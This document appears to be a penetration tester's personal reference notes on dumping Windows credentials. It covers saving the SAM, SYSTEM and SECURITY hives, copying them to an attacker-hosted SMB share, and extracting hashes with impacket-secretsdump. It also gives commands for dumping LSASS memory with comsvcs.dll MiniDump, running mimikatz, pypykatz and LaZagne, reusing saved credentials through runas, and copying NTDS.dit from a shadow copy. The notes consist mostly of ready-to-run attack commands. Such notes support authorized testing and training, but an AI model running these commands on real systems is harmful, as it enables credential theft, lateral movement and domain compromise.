Quick Reference
```bash
# SAM, SYSTEM, SECURITY, NTDS.dit
# locally
impacket-secretsdump -sam <SAM> -system <SYSTEM> -security <SECURITY> -ntds <NTDS.dit> LOCAL

# Remotely
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY -ntds NTDS -dc-ip <dc_ip> '<domain>'/'<username>':'<password>'@<target> [use-ntds]

# LSASS -- mimikatz or pypykatz
# Windows Credential Manager -- mimikatz or lazagne
# NTDS.dit -- nxc (BEST) or VSS
```

## Attacking SAM, SYSTEM, and SECURITY
With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline.

```bash
# Save reg hives
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Create share with smbserver (on attack host)
sudo impacket-smbserver -smb2support <SHARENAME> /home/kali/directory

# Move hive copies to share
move sam.save \\<kali_ip>\SHARENAME
move security.save \\<kali_ip>\SHARENAME
move system.save \\<kali_ip>\SHARENAME

# dump
impacket-secretsdump -sam <SAM> -system <SYSTEM> -security <SECURITY> LOCAL
```

For dumping sam, system, security, and NTDS.dit files

## Attacking LSASS
Local Security Authority Subsystem Service (LSASS) stores credential material in memory and is worth attacking.

Dumping
```PowerShell
# Task Manager Method
Open Task Manager > Processes > Local Security Authority Process > Create dump file

# Rundll31.exe & Comsvcs.dll Method
tasklist /svc        # Identify lsass.exe PID
Get-Process lsass    # Identify lsass.exe PID
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full # DUMP

# Transfer back however you like
```

Credential Extraction
```bash
# Pypykatz
pypykatz lsa minidump /home/peter/Documents/lsass.dmp

# Mimikatz can also be used 
```
Make note of any hashes as well as the DPAPI keys

## Windows Credential Manager
Credential Manager is a feature built into Windows since Server 2008 R2 and Windows 7. Thorough documentation on how it works is not publicly available, but essentially, it allows users and applications to securely store credentials relevant to other systems and websites

ALSO check out Cobalt strike notes [[7 Credential Access]]

Enumerate
```PowerShell
# Look at stored creds
cmdkey /list
# If you find a user cred, you can use runas to move laterally
runas /savecred /user:<HOST>\<USER> cmd # Might to look at UAC bypass after this
```
see [[UAC Bypass]]

Extract Creds
```PowerShell
# Mimikatz
mimikatz.exe
privilege::debug
token::elevate
sekurlsa::credman         # Consider just using the oneliner i have...

# LaZagne
.\LaZagne.exe all
```

## Attacking NTDS.dit
NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at %systemroot%/ntds on the domain controllers in a forest. The .dit stands for directory information tree.

We need local or domain admin
We can use either netexec (see above) or VSS

Volume Shadow Copy (VSS) Method
```PowerShell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

# Transfer back
# Dump
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```



